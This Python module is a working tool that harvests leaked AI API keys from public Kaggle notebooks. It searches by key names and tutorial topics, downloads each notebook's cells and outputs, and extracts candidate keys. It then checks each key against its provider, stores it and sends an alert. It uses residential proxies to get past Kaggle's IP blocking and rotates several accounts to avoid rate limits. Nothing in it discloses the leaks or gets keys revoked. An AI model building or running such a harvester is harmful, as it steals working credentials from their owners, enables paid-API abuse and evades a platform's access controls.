"""
Kaggle notebooks scanner — finds leaked AI API keys in public Jupyter notebooks.

Why Kaggle:
  - Data scientists routinely hardcode API keys in notebooks shared publicly
  - No GitHub Secret Scanning partnership → keys stay valid much longer
  - Cerebras, Together, Groq, HuggingFace, OpenRouter keys at high density
  - ~10M public notebooks, growing fast with AI competition wave

Architecture:
  - REST search API (Bearer KGAT_ token) to find relevant notebooks by keyword
  - kaggle Python package for downloading .ipynb source (handles gRPC auth)
  - Parses all cell sources + outputs from .ipynb JSON
  - Dedup via try_claim_file(sha256("kaggle:{owner}/{slug}"))
  - One worker per KGAT_ token, queries distributed round-robin

Rate limits (Kaggle):
  - Search: no documented limit, ~60 req/min observed safe
  - Pull: ~1 per second per account is safe
"""

import asyncio
import hashlib
import json
import base64
import logging
import os
import tempfile

import httpx

import db
from config import KAGGLE_TOKENS, KAGGLE_SCAN_INTERVAL, evomi_proxy_url
from patterns import EXTRACTORS, AI_TRIGGER
from deobfuscate import expand as _deobf_expand
from validators import validate
from notifier import notify_found

# Kaggle's Cloudflare layer datacenter-blocks Railway egress IPs (returns
# 404 even for valid Basic auth). Empirical probe (2026-05-06) showed
# Evomi US/GB/JP residential exits return 401 (auth challenge — i.e. the
# request reaches Kaggle), while Evomi CN exits get disconnected. We
# route Kaggle through Evomi US to bypass the IP filter.
import re as _re_country
def _kaggle_proxy_url() -> str | None:
    base = evomi_proxy_url()
    if not base:
        return None
    target = os.environ.get("KAGGLE_PROXY_COUNTRY", "us")
    return _re_country.sub(r'_country-[A-Za-z]{2}', f'_country-{target}', base)

log = logging.getLogger(__name__)

_BASE         = "https://www.kaggle.com/api/v1"

# Legacy Basic auth (KAGGLE_USERNAME + KAGGLE_KEY from kaggle.json) takes
# precedence — Kaggle's REST API endpoints (/api/v1/*) require Basic auth,
# the new "KGAT_*" tokens are for the SDK only and return 404 against /api/v1.
#
# Multi-account: KAGGLE_USERNAME and KAGGLE_KEY can each be a comma-separated
# list of equal length — pairwise zip into multiple Basic-auth strings. Each
# worker picks its own credentials round-robin → distributes search rate across
# accounts and lets us scan more queries per cycle without hitting per-account
# rate limits.
_kg_users = [u.strip() for u in os.environ.get("KAGGLE_USERNAME", "").split(",") if u.strip()]
_kg_keys  = [k.strip() for k in os.environ.get("KAGGLE_KEY",      "").split(",") if k.strip()]
_BASIC_AUTHS: list[str] = []
if _kg_users and _kg_keys and len(_kg_users) == len(_kg_keys):
    for u, k in zip(_kg_users, _kg_keys):
        _BASIC_AUTHS.append("Basic " + base64.b64encode(f"{u}:{k}".encode()).decode())
_PULL_SLEEP   = 1.5   # seconds between pulls per token
_SEARCH_SLEEP = 2.0   # seconds between search queries
_MAX_PAGES    = 7     # search pages per query (20 results/page = 140 notebooks)
_LANGUAGES    = ["python", "r"]  # R community uses openai/ellmer R packages

_LIMITS = httpx.Limits(
    max_connections=40,
    max_keepalive_connections=10,
    keepalive_expiry=30,
)

# Search queries — match notebook titles/descriptions that suggest AI key presence.
# Kaggle search indexes title, subtitle, tags, and (partially) source code.
_QUERIES: list[str] = [
    # ── Env var names — most likely to be in code comments / markdown cells ──
    # Major providers
    "OPENAI_API_KEY",
    "ANTHROPIC_API_KEY",
    "GEMINI_API_KEY",
    "GOOGLE_API_KEY",
    "DEEPSEEK_API_KEY",
    # Aggregators
    "OPENROUTER_API_KEY",
    "TOGETHER_API_KEY",
    "AIMLAPI_API_KEY",
    "DEEPINFRA_TOKEN",
    "HYPERBOLIC_API_KEY",
    "NOVITA_API_KEY",
    "PORTKEY_API_KEY",
    # Hosted-model APIs
    "GROQ_API_KEY",
    "CEREBRAS_API_KEY",
    "MISTRAL_API_KEY",
    "COHERE_API_KEY",
    "PERPLEXITY_API_KEY",
    "FIREWORKS_API_KEY",
    "REPLICATE_API_TOKEN",
    "FAL_KEY",
    # HuggingFace
    "HF_TOKEN",
    "HUGGINGFACE_TOKEN",
    "HUGGING_FACE_HUB_TOKEN",
    # Chinese ecosystem
    "ZHIPUAI_API_KEY",
    "GLM_API_KEY",
    "BIGMODEL_API_KEY",
    "MOONSHOT_API_KEY",
    "KIMI_API_KEY",
    "ARK_API_KEY",
    "DOUBAO_API_KEY",
    "VOLC_ACCESSKEY",
    "SILICONFLOW_API_KEY",
    "KLING_ACCESS_KEY",
    "KLING_SECRET_KEY",
    # Image / video / audio
    "STABILITY_API_KEY",
    "ELEVENLABS_API_KEY",
    "XI_API_KEY",
    "LUMA_API_KEY",
    "RUNWAYML_API_SECRET",
    "PIKA_API_KEY",
    "TWELVELABS_API_KEY",
    "INWORLD_BASE64",
    "WAVESPEED_API_KEY",
    "HEDRA_API_KEY",
    "KREA_API_KEY",
    "PIXVERSE_API_KEY",
    "HIGGSFIELD_API_KEY",
    # Search/agent tools
    "FIRECRAWL_API_KEY",
    "SERPER_API_KEY",
    # xAI / Grok
    "XAI_API_KEY",
    "GROK_API_KEY",

    # ── Notebook content patterns (titles + frontmatter) ──
    "langchain openai api key",
    "openai api key tutorial",
    "anthropic claude api tutorial",
    "huggingface inference api token",
    "gemini api python tutorial",
    "deepseek api python",
    "deepseek tutorial",
    "openrouter api python",
    "groq llama tutorial",
    "fireworks ai python",
    "replicate api python",
    "stability ai sdxl",
    "elevenlabs voice clone",
    "kling ai video",
    "luma dream machine",
    "fal.ai api",
    "siliconflow api",
    "zhipu glm api",
    "moonshot kimi api",
    "ark seedance api",
    "xai grok api",
    "perplexity sonar api",
    "mistral api python",
    "cohere api python",
    "novita ai api",
    "deepinfra api",
    "aimlapi tutorial",
    "hyperbolic api python",
    "portkey ai api",

    # ── Use-case patterns where keys often leak ──
    "langchain rag",
    "llamaindex rag",
    "rag pipeline tutorial",
    "rag question answering",
    "vector db pinecone openai",
    "qdrant rag",
    "weaviate rag",
    "chroma rag",
    "agentic workflow",
    "multi agent",
    "crewai tutorial",
    "autogen tutorial",
    "smolagents tutorial",
    "fine-tuning lora",
    "stable diffusion api",
    "image generation api",
    "video generation api",
    "tts elevenlabs",
    "voice cloning api",

    # ── Generic notebook title patterns ──
    "llm api keys notebook",
    "ai provider api",
    "inference api notebook",
    "chatbot tutorial api",
    "openai chatbot",
    "claude chatbot",
    "ai agent",
    "ai assistant",

    # ── Compliance / leaky framework patterns ──
    "litellm config",
    "litellm proxy",
    "openai_api_key environment",
    "load_dotenv",
    "kaggle secrets api",
]

# AI trigger strings for fast pre-scan (avoids running full regex on irrelevant cells)
_AI_TRIGGER = AI_TRIGGER


def _headers(token: str) -> dict:
    """Build Authorization header. Prefers KAGGLE_USERNAME+KAGGLE_KEY Basic
    auth (the only scheme accepted by /api/v1 endpoints); falls back to
    Bearer KGAT for backwards compat (will likely 404 but won't crash).

    `token` is repurposed: when Basic auths are configured, it's interpreted
    as the index hint to pick a Basic-auth string (round-robin per worker).
    Otherwise it's the literal Bearer token.
    """
    if _BASIC_AUTHS:
        # Worker token is "basic:<idx>:<username>" — parse idx for stable
        # per-worker assignment (each worker uses its own account end-to-end).
        idx = 0
        if token and token.startswith("basic:"):
            try:
                idx = int(token.split(":", 2)[1]) % len(_BASIC_AUTHS)
            except Exception:
                idx = 0
        return {"Authorization": _BASIC_AUTHS[idx], "Content-Type": "application/json"}
    return {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }


def _claim_key(ref: str) -> str:
    """Dedup key for a Kaggle notebook (owner/slug)."""
    return hashlib.sha256(f"kaggle:{ref}".encode()).hexdigest()[:40]


def _extract_notebook_text(ipynb_content: str) -> str:
    """Extract all source + output text from a .ipynb file."""
    try:
        nb = json.loads(ipynb_content)
    except Exception:
        return ipynb_content

    parts: list[str] = []
    for cell in nb.get("cells", []):
        src = cell.get("source", [])
        if isinstance(src, list):
            parts.append("".join(src))
        elif isinstance(src, str):
            parts.append(src)

        # Also scan outputs — devs sometimes print keys accidentally
        for out in cell.get("outputs", []):
            text = out.get("text", [])
            if isinstance(text, list):
                parts.append("".join(text))
            elif isinstance(text, str):
                parts.append(text)
            data = out.get("data", {})
            for val in data.values():
                if isinstance(val, list):
                    parts.append("".join(str(v) for v in val))
                elif isinstance(val, str):
                    parts.append(val)

    return "\n".join(parts)


async def _search_kernels(client: httpx.AsyncClient,
                          token: str, query: str, page: int,
                          language: str = "python") -> list[dict]:
    """Search Kaggle kernels by keyword. Returns list of kernel refs.

    Empirical (2026-05-06): passing language=python|r filter returns
    0 results from /api/v1/kernels/list (probably wrong expected value
    e.g. expects 'Python' capitalized, or filter isn't supported on this
    endpoint). Same query without `language` returns 20 results. So we
    drop the language filter — content extractors handle both .ipynb
    (Python) and .Rmd (R) cells uniformly.
    """
    try:
        r = await client.get(
            f"{_BASE}/kernels/list",
            headers=_headers(token),
            params={
                "search":    query,
                "page":      page,
                "pageSize":  20,
                "sortBy":    "hotness",
            },
            timeout=20,
        )
        if r.status_code in (401, 403):
            log.warning("[kaggle] token %s... dead/forbidden", token[:12])
            return []
        if r.status_code != 200:
            log.debug("[kaggle] search status=%d query=%r", r.status_code, query[:40])
            return []
        data = r.json()
        if not isinstance(data, list):
            return []
        return data
    except Exception as e:
        log.debug("[kaggle] search err query=%r: %s", query[:40], e)
        return []


def _pull_kernel_sync(token: str, ref: str, tmpdir: str) -> str | None:
    """
    Synchronous kaggle package kernel pull. Runs in asyncio.to_thread().
    Uses KAGGLE_API_TOKEN env var which the package reads via get_access_token_from_env().
    """
    old_token = os.environ.get("KAGGLE_API_TOKEN", "")
    try:
        os.environ["KAGGLE_API_TOKEN"] = token
        from kaggle.api.kaggle_api_extended import KaggleApi
        api = KaggleApi()
        api.authenticate()
        api.kernels_pull(ref, path=tmpdir, quiet=True)

        files = os.listdir(tmpdir)
        if not files:
            return None
        fpath = os.path.join(tmpdir, files[0])
        with open(fpath, encoding="utf-8", errors="replace") as f:
            return f.read()
    except Exception as e:
        log.debug("[kaggle] pull err ref=%s: %s", ref, e)
        return None
    finally:
        if old_token:
            os.environ["KAGGLE_API_TOKEN"] = old_token
        else:
            os.environ.pop("KAGGLE_API_TOKEN", None)


async def _fetch_kernel_source(token: str, ref: str) -> str | None:
    """Download kernel source in a thread to avoid blocking the event loop."""
    with tempfile.TemporaryDirectory() as tmpdir:
        return await asyncio.to_thread(_pull_kernel_sync, token, ref, tmpdir)


async def _scan_notebook(ref: str, content: str) -> tuple[int, int]:
    """Run extractors on notebook content and persist findings.
    Returns (keys_saved, valid_keys_saved) for per-query yield tracking."""
    text = _extract_notebook_text(content)
    text = _deobf_expand(text)
    if not any(t in text for t in _AI_TRIGGER):
        return 0, 0

    owner, slug = (ref.split("/", 1) + [""])[:2]
    file_url = f"https://www.kaggle.com/{ref}"
    repo_label = ref  # use ref as repo identifier in DB

    keys_saved = 0
    valid_saved = 0
    for prov, fn in EXTRACTORS.items():
        for key in fn(text):
            if db.key_exists(key):
                continue
            is_valid = await validate(prov, key)
            saved = db.save_key(
                prov, key, repo_label, "notebook.ipynb", file_url,
                0, "", "kaggle", is_valid,
            )
            if saved:
                keys_saved += 1
                if is_valid:
                    valid_saved += 1
                await notify_found(
                    prov, key, repo_label, "notebook.ipynb", file_url,
                    0, "", "kaggle", is_valid,
                )
                log.info("[kaggle %s] %s from %s",
                         "VALID" if is_valid else "found", prov, ref)
    return keys_saved, valid_saved


async def _run_worker(token: str, queries: list[str], worker_id: int):
    """Search + pull worker for one Kaggle token."""
    log.info("[kaggle w%d token=%s...] %d queries", worker_id, token[:12], len(queries))

    # Route only kaggle.com traffic through Evomi US residential proxy.
    # Validator calls (openai, deepseek, etc) go direct — saves bandwidth.
    proxy = _kaggle_proxy_url()
    mounts = (
        {
            "https://www.kaggle.com": httpx.AsyncHTTPTransport(proxy=proxy),
            "http://www.kaggle.com":  httpx.AsyncHTTPTransport(proxy=proxy),
        }
        if proxy else {}
    )
    if proxy and worker_id == 0:
        log.info("kaggle: routing kaggle.com via Evomi proxy (kaggle.com only)")

    async with httpx.AsyncClient(follow_redirects=True, limits=_LIMITS,
                                 mounts=mounts) as client:
        scanned: set[str] = set()

        for query in queries:
            # Per-query yield counters for kaggle_themer feedback loop.
            q_kernels_seen   = 0
            q_keys_saved     = 0
            q_valid_saved    = 0
            # Single search per query — language filter dropped (Kaggle returns
            # 0 results when language is set). Content extractors handle both
            # .ipynb (Python) and .Rmd (R) uniformly.
            for page in range(1, _MAX_PAGES + 1):
                kernels = await _search_kernels(client, token, query, page)
                if not kernels:
                    break
                q_kernels_seen += len(kernels)

                for k in kernels:
                    ref = k.get("ref", "")
                    if not ref or ref in scanned:
                        continue

                    ck = _claim_key(ref)
                    if not db.try_claim_file(ck):
                        continue

                    scanned.add(ref)
                    # Track unique kernel refs scanned for stats / TG digest.
                    # Distinct from scanned_files (sha256 hash) so we can count
                    # actual notebooks processed across cycles.
                    db.kaggle_mark_scanned(ref)
                    content = await _fetch_kernel_source(token, ref)
                    if content:
                        ks, vs = await _scan_notebook(ref, content)
                        q_keys_saved  += ks
                        q_valid_saved += vs

                    await asyncio.sleep(_PULL_SLEEP)

                if len(kernels) < 20:
                    break
                await asyncio.sleep(_SEARCH_SLEEP)

            # Per-query yield update — only matters for dynamic queries
            # (static queries aren't in kaggle_dynamic_queries so the
            # UPDATE is a silent no-op for them; matches GitHub pattern).
            try:
                db.kaggle_record_query_yield(query, q_kernels_seen,
                                             q_keys_saved, q_valid_saved)
            except Exception as e:
                log.debug("kaggle yield update failed: %s", e)

            await asyncio.sleep(_SEARCH_SLEEP)

    log.info("[kaggle w%d] cycle done, %d unique notebooks processed",
             worker_id, len(scanned))


def _worker_tokens() -> list[str]:
    """Pick the per-worker auth identity list. Prefers Basic-auth pairs
    (KAGGLE_USERNAME/KAGGLE_KEY) since /api/v1 only accepts Basic; falls
    back to KGAT KAGGLE_TOKENS otherwise. Each entry maps to one worker
    that uses that account's auth via _headers()."""
    if _BASIC_AUTHS:
        # Use a stable, distinct synthetic token per Basic-auth pair.
        # _headers() hashes this to select the right auth string.
        return [f"basic:{i}:{_kg_users[i]}" for i in range(len(_BASIC_AUTHS))]
    return list(KAGGLE_TOKENS)


def _all_queries() -> list[str]:
    """Static queries + LLM-generated dynamic queries (sorted by yield).
    Dynamic queries come from kaggle_dynamic_queries table populated by
    kaggle_themer.py. Static queries always run; dynamics give 5-10× more
    coverage and adapt over time."""
    static = list(_QUERIES)
    try:
        dynamic = db.kaggle_active_queries(limit=300)
    except Exception as e:
        log.debug("kaggle: dynamic query fetch failed: %s", e)
        dynamic = []
    # Dedup preserving order: dynamics first (theme-tuned, higher yield), then statics
    seen = set()
    out = []
    for q in dynamic + static:
        if q in seen:
            continue
        seen.add(q)
        out.append(q)
    return out


async def run_kaggle_cycle():
    workers_auth = _worker_tokens()
    if not workers_auth:
        return

    queries = _all_queries()
    n_static  = len(_QUERIES)
    n_dynamic = len(queries) - n_static
    n = len(workers_auth)
    chunks: list[list[str]] = [[] for _ in range(n)]
    for i, q in enumerate(queries):
        chunks[i % n].append(q)

    auth_kind = "basic" if _BASIC_AUTHS else "kgat"
    log.info("=== kaggle cycle start | %d %s accounts | %d queries (%d static + %d dynamic) ===",
             n, auth_kind, len(queries), n_static, n_dynamic)

    workers = [
        asyncio.create_task(
            _run_worker(workers_auth[i], chunks[i], i),
            name=f"kaggle_w{i}",
        )
        for i in range(n)
        if chunks[i]
    ]
    results = await asyncio.gather(*workers, return_exceptions=True)
    for r in results:
        if isinstance(r, Exception):
            log.error("kaggle worker crashed: %s", r)

    log.info("=== kaggle cycle done ===")


async def kaggle_loop():
    if not KAGGLE_TOKENS and not _BASIC_AUTHS:
        log.info("kaggle: no KAGGLE_TOKENS or KAGGLE_USERNAME/KEY configured — skipping")
        return

    n_accounts = len(_BASIC_AUTHS) if _BASIC_AUTHS else len(KAGGLE_TOKENS)
    auth_kind  = "basic" if _BASIC_AUTHS else "kgat"
    log.info("kaggle scanner started | %d %s accounts | %d queries | interval=%ds",
             n_accounts, auth_kind, len(_QUERIES), KAGGLE_SCAN_INTERVAL)

    while True:
        try:
            await run_kaggle_cycle()
        except Exception as e:
            log.error("kaggle cycle crashed: %s", e)
        log.info("kaggle sleeping %ds until next cycle", KAGGLE_SCAN_INTERVAL)
        await asyncio.sleep(KAGGLE_SCAN_INTERVAL)
